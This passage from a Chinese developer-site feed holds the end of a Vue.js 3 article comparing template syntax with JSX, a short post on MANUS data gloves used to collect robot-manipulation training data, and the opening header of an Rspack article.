  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> auto;
  <span class="hljs-attribute">text-align</span>: center;
}

<span class="hljs-selector-class">.counter</span> <span class="hljs-selector-class">.text</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28px</span>;
  <span class="hljs-attribute">font-weight</span>: bolder;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666666</span>;
}

<span class="hljs-selector-class">.counter</span> <span class="hljs-selector-class">.btn</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">32px</span>;
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">80px</span>;
  <span class="hljs-attribute">cursor</span>: pointer;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>这就是单文件组件（Single File Component，简称 SFC）的基本结构，通过这种形式，我们可以把 HTML 视觉效果、JavaScript 交互逻辑和 CSS 样式控制很好地整合在一起，形成一个独立的功能单元。</p>
<h2 data-id="heading-4">什么是JSX语法？</h2>
<p>除了上面介绍的单文件组件（SFC）的模板语法，Vue.js 3 也支持 JSX 语法。JSX 是一种 JavaScript 的语法扩展，它允许你在 JavaScript 代码中编写类似 HTML 的标记。</p>
<p>JSX 语法最初是在 React 中广泛使用的，后来 Vue.js 也提供了对 JSX 的支持，让开发者有了更多的选择。</p>
<h3 data-id="heading-5">JSX语法的实现方式</h3>
<p>我们还是以上面的加数器为例，用 JSX 语法来实现，代码如下所示：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineComponent, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineComponent</span>({
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onClick</span> = (<span class="hljs-params"/>) =&gt; {
      count.<span class="hljs-property">value</span>++;
    };

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"counter"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text"</span>&gt;</span>Count: {count.value}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onClick}</span>&gt;</span>Add<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
  }
});
</code></pre>
<p>或者使用 Composition API 和 JSX 结合的方式：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onClick</span> = (<span class="hljs-params"/>) =&gt; {
      count.<span class="hljs-property">value</span>++;
    };

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"counter"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text"</span>&gt;</span>Count: {count.value}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onClick}</span>&gt;</span>Add<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
  }
};
</code></pre>
<p>在 JSX 语法中，我们需要通过 Babel 插件来转换 JSX 语法，使其能够在浏览器中正常运行。</p>
<h3 data-id="heading-6">JSX 与模板语法的比较</h3>
<h4 data-id="heading-7">模板语法的优势：</h4>
<ol>
<li><strong>直观性</strong>：对于熟悉 HTML 的开发者来说，模板语法更加直观，因为它与标准的 HTML 非常相似。</li>
<li><strong>简洁性</strong>：在处理简单的 UI 逻辑时，模板语法通常比 JSX 更简洁。</li>
<li><strong>工具支持</strong>：大多数编辑器和 IDE 对 HTML 模板都有很好的支持，包括语法高亮、自动补全等。</li>
<li><strong>性能优化</strong>：Vue.js 可以在编译时对模板进行静态分析和优化，因为模板的结构是固定的。</li>
</ol>
<h4 data-id="heading-8">JSX 语法的优势：</h4>
<ol>
<li><strong>灵活性</strong>：JSX 提供了更强大的编程能力，你可以像写 JavaScript 一样写视图逻辑，能够更灵活地处理复杂的 UI 逻辑。</li>
<li><strong>逻辑表达</strong>：在处理复杂条件渲染或循环时，JSX 可能会更直观，因为你直接使用 JavaScript 的逻辑操作符。</li>
<li><strong>类型检查</strong>：如果你使用 TypeScript，JSX 可以提供更好的类型检查支持。</li>
<li><strong>社区生态</strong>：如果你的团队已经熟悉 React 或其他使用 JSX 的框架，那么在 Vue.js 中使用 JSX 可以降低学习成本。</li>
</ol>
<h2 data-id="heading-9">如何选择模板语法还是JSX？</h2>
<p>在实际开发中，选择哪种语法主要取决于以下几个因素：</p>
<h3 data-id="heading-10">项目类型和规模</h3>
<ul>
<li><strong>中小型项目</strong>：对于功能相对简单、页面数量不多的项目，模板语法通常是更好的选择，因为它更容易理解和维护。</li>
<li><strong>大型复杂项目</strong>：对于功能复杂、逻辑繁多的项目，JSX 的灵活性可能更有优势，尤其是在处理复杂的数据流和条件逻辑时。</li>
</ul>
<h3 data-id="heading-11">团队技能和偏好</h3>
<ul>
<li><strong>传统前端团队</strong>：如果团队成员更熟悉 HTML 和传统的 Web 开发模式，模板语法会更受欢迎。</li>
<li><strong>React 背景团队</strong>：如果团队成员有 React 开发经验，他们可能会更倾向于使用 JSX。</li>
</ul>
<h3 data-id="heading-12">生态系统和工具链</h3>
<ul>
<li><strong>Vue 生态</strong>：模板语法是 Vue 的原生语法，拥有更完善的生态系统和工具支持。</li>
<li><strong>跨框架项目</strong>：如果项目需要在多个框架之间共享组件逻辑，JSX 可能更容易迁移和复用。</li>
</ul>
<h3 data-id="heading-13">学习曲线</h3>
<ul>
<li><strong>初学者</strong>：对于刚接触 Vue.js 的开发者，模板语法的学习曲线可能更平缓，因为它更接近标准的 HTML。</li>
<li><strong>有经验的开发者</strong>：有 React 或其他 JSX 经验的开发者可能会更快适应 JSX 语法。</li>
</ul>
<h2 data-id="heading-14">实际应用场景举例</h2>
<h3 data-id="heading-15">场景一：简单的表单组件</h3>
<p>对于简单的表单组件，模板语法更加清晰直观：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;form @submit.prevent="handleSubmit"&gt;
    &lt;input 
      v-model="formData.name" 
      type="text" 
      placeholder="姓名" 
      class="form-input"
    /&gt;
    &lt;input 
      v-model="formData.email" 
      type="email" 
      placeholder="邮箱" 
      class="form-input"
    /&gt;
    &lt;button type="submit" class="submit-btn"&gt;提交&lt;/button&gt;
  &lt;/form&gt;
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-16">场景二：复杂的数据展示组件</h3>
<p>对于需要根据多种条件动态渲染元素的复杂数据展示组件，JSX 可能更灵活：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">renderData</span> = (<span class="hljs-params">data, level = <span class="hljs-number">0</span></span>) =&gt; {
    <span class="hljs-keyword">if</span> (!data || !<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(data)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">level-</span>${<span class="hljs-attr">level</span>}`}&gt;</span>
        {item.title &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{item.title}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>}
        {item.content &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{item.content}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
        {item.children &amp;&amp; renderData(item.children, level + 1)}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    ));
  };

  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"data-container"</span>&gt;</span>
      {renderData(props.dataList)}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-17">总结</h2>
<p>Vue.js 3 同时支持模板语法和 JSX 语法，各有其优势和适用场景。模板语法更适合简单直观的 UI 逻辑，而 JSX 语法则提供了更大的灵活性，适合处理复杂的视图逻辑。</p>
<p>作为 Vue.js 开发者，了解这两种语法的特点和适用场景，可以帮助我们在不同的项目中做出合适的选择。无论选择哪种语法，核心都是实现高质量、可维护的用户界面。</p>
<p>在学习 Vue.js 3 的过程中，建议先掌握模板语法，因为它更接近 Vue 的设计理念，并且拥有更好的工具支持。当你需要更灵活的视图逻辑处理能力时，再考虑使用 JSX 语法。</p>
<p>最重要的是，选择最适合你的团队和项目的语法，而不是盲目追求某种特定的写法。无论使用哪种语法，最终的目标都是构建出高效、稳定、易于维护的应用程序。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MANUS：用于视觉、语言、行动模型创建的高保真第一人称数据采集设备]]></title>    <link>https://juejin.cn/post/7595034434975498278</link>    <guid>https://juejin.cn/post/7595034434975498278</guid>    <pubDate>2026-01-14T09:30:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595034434975498278" data-draft-id="7595030559564087347" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MANUS：用于视觉、语言、行动模型创建的高保真第一人称数据采集设备"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T09:30:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱迪斯通"/> <meta itemprop="url" content="https://juejin.cn/user/2672256188156042"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MANUS：用于视觉、语言、行动模型创建的高保真第一人称数据采集设备
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2672256188156042/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱迪斯通
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:30:16.000Z" title="Wed Jan 14 2026 09:30:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/957e16c237b840d5a5f22b73b708d8e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix6L-q5pav6YCa:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987816&amp;x-signature=xB4B7VBCIriSwxcn9IFpYMf2%2B6c%3D" alt="图片1.png" loading="lazy"/></p>
<p>“RoboBrain-Dex：多源自我中心训练用于集成灵巧视觉-语言-行动模型”。</p>
<p>灵巧手遥操作目前为止仍然是机器人技术中最具挑战性的前沿领域之一。尽管视觉-语言-动作模型在通用机器人能力方面表现出很大潜力，但其面临一个关键瓶颈：灵巧手技能的大规模学习、动作注释数据稀缺。传统遥操作方法成本高且耗时，而现有的人类运动数据集则存在视角依赖、遮挡和捕获环境受限等问题，这限制了它们在机器人训练中的应用。</p>
<p>北京大学和北京人工智能学院的研究人员开发了RoboBrain-Dex，这是一个通过利用MANUS数据手套来克服这些数据收集挑战的灵巧手操作的突破性视觉-语言-动作模型。其工作展示了高保真手部追踪如何实现大规模、多源的自我中心数据集的创建，这些数据集将人类和机器人操作紧密联系在一起。</p>
<p><strong><strong>便携式、高保真大规模数据收集</strong></strong></p>
<p>RoboBrain-Dex 研究团队构建了Ego Atlas，一个综合的多源自我中心数据集，将人类和机器人操作数据统一在一个动作空间下。其数据收集基础设施的核心：MANUS Quantum Metagloves 可捕捉每只手的所有25个手关键点的精确3D位置。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8776195a8b1a4c918c2314f55c448605~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix6L-q5pav6YCa:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987816&amp;x-signature=YVnmkyPOJP74AyYQ%2BR%2FUGXGV8Hg%3D" alt="ScreenShot_2026-01-14_165059_420.png" loading="lazy"/></p>
<p>与受限于捕捉体积和遮挡问题的基于相机或VR追踪系统不同，MANUS手套追踪系统 实现了便携、随时随地的动作捕捉。结合VIVE追踪器进行6自由度手腕姿态追踪，该系统提供了手部定位，同时保持指尖级的精度。这种方法消除了视角依赖性，并能够在各种真实环境下收集数据，这对于构建用于稳定的VLA模型训练所需的规模和多样化的数据集至关重要。</p>
<p><strong><strong>从人类演示到机器人控制</strong></strong></p>
<p>由MANUS手套捕获的高保真运动数据在RoboBrain-Dex管道中起到了双重作用。对于人类演示，手套记录了自然的操纵行为，为学习机器人动作提供了丰富的先验知识。对于机器人远程操作，相同的手套追踪系统实现了精确控制：通过逆运动学将手腕姿势转换为机器人手臂配置，而指尖轨迹通过基于IK的重新目标映射到灵巧手关节空间。</p>
<p>​</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a8100d3115b41e2bc172673123d9327~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix6L-q5pav6YCa:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987816&amp;x-signature=oiZREaV0JWYAzJAAZW5nL1hTGRc%3D" alt="ScreenShot_2026-01-14_165121_242.png" loading="lazy"/></p>
<p>这种无缝的人机翻译对于收集补充RoboBrain-Dex人类数据集的机器人演示数据至关重要。研究人员成功地将这种远程控制方法应用于配备Inspire 6-DoF灵巧手的Unitree G1人形机器人上，收集了高质量的多种操作任务演示数据。</p>
<p><strong><strong>推动该领域发展的成果</strong></strong></p>
<p>基于由MANUS手套支持的多源第一人称数据，RoboBrain-Dex在六个真实世界的灵巧操作任务中实现了超高的平均成功率。该模型在分布外场景中表现出色。</p>
<p>RoboBrain-Dex模型代表了一个重要的转变，通过数据采集设备MANUS的毫米级手部追踪精度和便携、可扩展的部署训练机器人灵巧手更加贴合真实人类操作。随着具身人工智能继续向人类水平的操纵能力发展，高保真第一人称数据采集设备仍然是弥合人类灵巧度与机器人智能之间差距的基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rspack核心解析：Rust重写Webpack的性能革命与本质]]></title>    <link>https://juejin.cn/post/7595021077665628211</link>    <guid>https://juejin.cn/post/7595021077665628211</guid>    <pubDate>2026-01-14T09:40:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021077665628211" data-draft-id="7594859060857978890" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rspack核心解析：Rust重写Webpack的性能革命与本质"/> <meta itemprop="keywords" content="前端,前端工程化"/> <meta itemprop="datePublished" content="2026-01-14T09:40:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="eason_fan"/> <meta itemprop="url" content="https://juejin.cn/user/2995517308808877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rspack核心解析：Rust重写Webpack的性能革命与本质
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2995517308808877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    eason_fan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:40:15.000Z" title="Wed Jan 14 2026 09:40:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读19分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Rspack核心解析：Rust重写Webpack的性能革命与本质</h2>
